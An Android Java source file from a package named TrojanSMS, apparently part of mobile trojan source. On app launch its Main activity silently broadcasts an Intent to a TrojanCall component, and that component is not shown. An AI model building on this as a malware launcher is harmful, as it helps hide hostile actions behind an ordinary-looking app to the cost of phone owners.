package com.flu.TrojanSMS;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class Main extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        Intent itroyano = new Intent(this, TrojanCall.class);
        sendBroadcast(itroyano);
    }
}

